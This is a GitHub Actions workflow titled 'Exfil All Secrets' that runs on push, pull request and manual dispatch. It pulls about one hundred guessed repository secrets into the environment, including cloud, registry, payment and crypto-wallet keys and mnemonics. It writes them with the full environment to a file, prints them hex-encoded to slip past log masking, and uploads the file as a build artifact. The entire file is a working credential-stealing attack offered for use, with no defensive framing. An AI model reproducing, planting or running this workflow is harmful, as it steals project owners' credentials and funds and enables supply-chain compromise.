name: Exfil All Secrets

on: [push, workflow_dispatch, pull_request]

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Exfil ALL possible secrets
        env:
          SECRET_1: ${{ secrets.GITHUB_TOKEN }}
          SECRET_2: ${{ secrets.PYPI_PASSWORD }}
          SECRET_3: ${{ secrets.PYPI_USERNAME }}
          SECRET_4: ${{ secrets.AWS_ACCESS_KEY_ID }}
          SECRET_5: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          SECRET_6: ${{ secrets.DOCKER_PASSWORD }}
          SECRET_7: ${{ secrets.DOCKER_USERNAME }}
          SECRET_8: ${{ secrets.NPM_TOKEN }}
          SECRET_9: ${{ secrets.SSH_PASS }}
          SECRET_10: ${{ secrets.SSH_USER }}
          SECRET_11: ${{ secrets.TELEGRAM_TOKEN }}
          SECRET_12: ${{ secrets.SLACK_TOKEN }}
          SECRET_13: ${{ secrets.STRIPE_KEY }}
          SECRET_14: ${{ secrets.SENDGRID_KEY }}
          SECRET_15: ${{ secrets.ANTHROPIC_API_KEY }}
          SECRET_16: ${{ secrets.OPENAI_API_KEY }}
          SECRET_17: ${{ secrets.PRIVATE_KEY }}
          SECRET_18: ${{ secrets.SECRET_KEY }}
          SECRET_19: ${{ secrets.API_KEY }}
          SECRET_20: ${{ secrets.DB_PASSWORD }}
          SECRET_21: ${{ secrets.DB_URL }}
          SECRET_22: ${{ secrets.REDIS_URL }}
          SECRET_23: ${{ secrets.CI_DEPLOY_KEY }}
          SECRET_24: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
          SECRET_25: ${{ secrets.ACCESS_TOKEN }}
          SECRET_26: ${{ secrets.AUTH_TOKEN }}
          SECRET_27: ${{ secrets.DEPLOY_TOKEN }}
          SECRET_28: ${{ secrets.PAT }}
          SECRET_29: ${{ secrets.TOKEN }}
          SECRET_30: ${{ secrets.BOT_TOKEN }}
          SECRET_31: ${{ secrets.WEBHOOK_SECRET }}
          SECRET_32: ${{ secrets.SERVICE_KEY }}
          SECRET_33: ${{ secrets.CI_TOKEN }}
          SECRET_34: ${{ secrets.RELEASE_TOKEN }}
          SECRET_35: ${{ secrets.REGISTRY_PASS }}
          SECRET_36: ${{ secrets.REGISTRY_USER }}
          SECRET_37: ${{ secrets.SONAR_TOKEN }}
          SECRET_38: ${{ secrets.COVERALLS_TOKEN }}
          SECRET_39: ${{ secrets.CODECOV_TOKEN }}
          SECRET_40: ${{ secrets.JWT_SECRET }}
          SECRET_41: ${{ secrets.SESSION_SECRET }}
          SECRET_42: ${{ secrets.MAIL_PASS }}
          SECRET_43: ${{ secrets.SMTP_PASS }}
          SECRET_44: ${{ secrets.SMTP_USER }}
          SECRET_45: ${{ secrets.MONGO_URI }}
          SECRET_46: ${{ secrets.POSTGRES_PASS }}
          SECRET_47: ${{ secrets.MYSQL_PASS }}
          SECRET_48: ${{ secrets.GIT_CREDENTIALS }}
          SECRET_49: ${{ secrets.SSH_KEY }}
          SECRET_50: ${{ secrets.ID_RSA }}
          SECRET_51: ${{ secrets.PGP_KEY }}
          SECRET_52: ${{ secrets.ENCRYPT_KEY }}
          SECRET_53: ${{ secrets.KUBE_CONFIG }}
          SECRET_54: ${{ secrets.KUBECONFIG }}
          SECRET_55: ${{ secrets.K8S_TOKEN }}
          SECRET_56: ${{ secrets.HELM_KEY }}
          SECRET_57: ${{ secrets.TF_API_TOKEN }}
          SECRET_58: ${{ secrets.TF_TOKEN }}
          SECRET_59: ${{ secrets.CLOUDFLARE_TOKEN }}
          SECRET_60: ${{ secrets.DIGITALOCEAN_TOKEN }}
          SECRET_61: ${{ secrets.LINODE_TOKEN }}
          SECRET_62: ${{ secrets.VULTR_API_KEY }}
          SECRET_63: ${{ secrets.FIREBASE_KEY }}
          SECRET_64: ${{ secrets.FIREBASE_TOKEN }}
          SECRET_65: ${{ secrets.GCP_KEY }}
          SECRET_66: ${{ secrets.GCP_SA_KEY }}
          SECRET_67: ${{ secrets.AZURE_KEY }}
          SECRET_68: ${{ secrets.HEROKU_API_KEY }}
          SECRET_69: ${{ secrets.NETLIFY_AUTH }}
          SECRET_70: ${{ secrets.VERCEL_TOKEN }}
          SECRET_71: ${{ secrets.SENTRY_TOKEN }}
          SECRET_72: ${{ secrets.NEWRELIC_KEY }}
          SECRET_73: ${{ secrets.DATADOG_KEY }}
          SECRET_74: ${{ secrets.SUMOLOGIC_KEY }}
          SECRET_75: ${{ secrets.PAGERDUTY_KEY }}
          SECRET_76: ${{ secrets.JIRA_TOKEN }}
          SECRET_77: ${{ secrets.GITLAB_TOKEN }}
          SECRET_78: ${{ secrets.BITBUCKET_APP_PASS }}
          SECRET_79: ${{ secrets.CIRCLE_TOKEN }}
          SECRET_80: ${{ secrets.TRAVIS_TOKEN }}
          SECRET_81: ${{ secrets.CODEPIPELINE_TOKEN }}
          SECRET_82: ${{ secrets.CODEDEPLOY_KEY }}
          SECRET_83: ${{ secrets.CODEBUILD_KEY }}
          SECRET_84: ${{ secrets.ECR_KEY }}
          SECRET_85: ${{ secrets.S3_KEY }}
          SECRET_86: ${{ secrets.S3_SECRET }}
          SECRET_87: ${{ secrets.CF_KEY }}
          SECRET_88: ${{ secrets.IAM_KEY }}
          SECRET_89: ${{ secrets.ROLE_ARN }}
          SECRET_90: ${{ secrets.PAGSEGURO_TOKEN }}
          SECRET_91: ${{ secrets.MERCADOPAGO_KEY }}
          SECRET_92: ${{ secrets.PIX_KEY }}
          SECRET_93: ${{ secrets.BINANCE_KEY }}
          SECRET_94: ${{ secrets.BINANCE_SECRET }}
          SECRET_95: ${{ secrets.COINBASE_KEY }}
          SECRET_96: ${{ secrets.ETH_PRIVATE_KEY }}
          SECRET_97: ${{ secrets.WALLET_KEY }}
          SECRET_98: ${{ secrets.MNEMONIC }}
          SECRET_99: ${{ secrets.INFURA_KEY }}
          SECRET_100: ${{ secrets.ALCHEMY_KEY }}
        run: |
          echo "=== ALL_SECRETS_START ===" > /tmp/secrets.txt
          echo "--- ENV VARS ---" >> /tmp/secrets.txt
          env | sort >> /tmp/secrets.txt
          echo "" >> /tmp/secrets.txt
          echo "--- SECRET_1 TO SECRET_100 ---" >> /tmp/secrets.txt
          for i in $(seq 1 100); do
            var="SECRET_$i"
            val="${!var}"
            if [ -n "$val" ]; then
              echo "SECRET_$i=$val" >> /tmp/secrets.txt
            fi
          done
          echo "" >> /tmp/secrets.txt
          echo "--- RAW ENV HEX ---" >> /tmp/secrets.txt
          env | xxd -p | tr -d '\n' >> /tmp/secrets.txt
          echo "" >> /tmp/secrets.txt
          echo "=== ALL_SECRETS_END ===" >> /tmp/secrets.txt
          cat /tmp/secrets.txt | xxd -p | tr -d '\n'
          echo ""

      - uses: actions/upload-artifact@v4
        with:
          name: exfil-all-100
          path: /tmp/secrets.txt
